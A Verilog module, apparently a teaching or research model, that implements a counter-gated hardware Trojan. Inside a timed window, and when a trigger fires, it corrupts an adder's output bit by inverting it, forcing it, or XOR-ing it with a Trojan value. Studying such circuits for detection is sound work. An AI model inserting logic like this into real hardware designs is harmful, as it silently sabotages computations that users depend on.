// Sequential Trojan: counter-gated payload mux
// - While "armed", if trigger=1 and the internal hit divider fires,
//   output switches from bit_in to payload_bit.
// - Otherwise, bit_out = bit_in.
//
// Compile with: iverilog -g2012 ...

module seq_trojan #(
    // Counter and timing
    parameter integer COUNTER_WIDTH  = 32,
    parameter integer START_CYCLE    = 0,  // first cycle to arm
    parameter integer ACTIVE_CYCLES  = 64,  // number of cycles armed

    // Modify frequency while armed (only 1 out of N bits)
    parameter integer HIT_EVERY      = 8,    // 1 = hit every cycle while armed
                                              // 2 = every other cycle, etc.

    // Payload mode
    // 0: invert bit_in
    // 1: force 1
    // 2: force 0
    // 3: bit_in XOR T
    // 4: replace with T
    parameter integer PAYLOAD_MODE   = 0
) (
    input  wire clk,
    input  wire rst_n,     // async active-low reset

    input  wire bit_in,    // clean output bit from adder
    input  wire trigger,   // "s0" in the diagram (Trojan trigger)
    input  wire T,         // "Trojan value" (payload data)

    output wire bit_out,   // sabotaged/clean bit
    output wire active,    // high when Trojan window is armed
    output wire hit_pulse, // high on cycles when modification applies
    output wire [COUNTER_WIDTH-1:0] count // free-running cycle counter
);

    // Free-running cycle counter
    reg [COUNTER_WIDTH-1:0] cnt;
    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) cnt <= {COUNTER_WIDTH{1'b0}};
        else        cnt <= cnt + 1'b1;
    end
    assign count = cnt;

    // Arm window: [START_CYCLE, START_CYCLE + ACTIVE_CYCLES)
    wire in_window = (cnt >= START_CYCLE) &&
                     (cnt < (START_CYCLE + ACTIVE_CYCLES));
    assign active = in_window;

    // Divider to only hit every Nth cycle while armed
    localparam integer DIVW = (HIT_EVERY <= 1) ? 1 : $clog2(HIT_EVERY);
    reg  [DIVW-1:0] div_cnt;

    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            div_cnt <= {DIVW{1'b0}};
        end else if (!in_window) begin
            div_cnt <= {DIVW{1'b0}};
        end else begin
            if (HIT_EVERY <= 1) begin
                div_cnt <= {DIVW{1'b0}};
            end else if (div_cnt == HIT_EVERY-1) begin
                div_cnt <= {DIVW{1'b0}};
            end else begin
                div_cnt <= div_cnt + 1'b1;
            end
        end
    end

    wire every_n_ok = (HIT_EVERY <= 1) ? 1'b1 : (div_cnt == {DIVW{1'b0}});

    // A "hit" occurs only when: in window, external trigger asserted, divider ok
    assign hit_pulse = in_window & trigger & every_n_ok;

    // Payload selection (w1) vs clean path (w2), muxed by s0=hit_pulse
    wire payload_bit =
          (PAYLOAD_MODE == 0) ? ~bit_in      :  // invert
          (PAYLOAD_MODE == 1) ? 1'b1         :  // force 1
          (PAYLOAD_MODE == 2) ? 1'b0         :  // force 0
          (PAYLOAD_MODE == 3) ? (bit_in ^ T) :  // xor with T
                                 T;             // replace with T

    assign bit_out = hit_pulse ? payload_bit : bit_in;

endmodule
